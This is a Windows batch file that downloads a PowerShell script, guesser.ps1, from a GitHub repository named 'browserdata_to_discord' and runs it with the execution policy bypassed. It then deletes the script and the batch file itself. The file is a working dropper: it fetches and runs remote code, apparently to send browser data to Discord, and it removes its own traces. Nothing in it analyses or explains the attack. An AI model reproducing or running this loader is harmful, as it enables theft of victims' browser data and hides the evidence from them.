@echo off
set SCRIPT_URL=https://raw.githubusercontent.com/pentestfunctions/browserdata_to_discord/main/guesser.ps1
set SCRIPT_NAME=guesser.ps1

REM Download the script
powershell -Command "Invoke-WebRequest -Uri %SCRIPT_URL% -OutFile %SCRIPT_NAME%"

REM Run the script
powershell -ExecutionPolicy Bypass -File %SCRIPT_NAME%

REM Clean up the script
del %SCRIPT_NAME%

REM Delete this batch file. %0 refers to the current script.
del %0
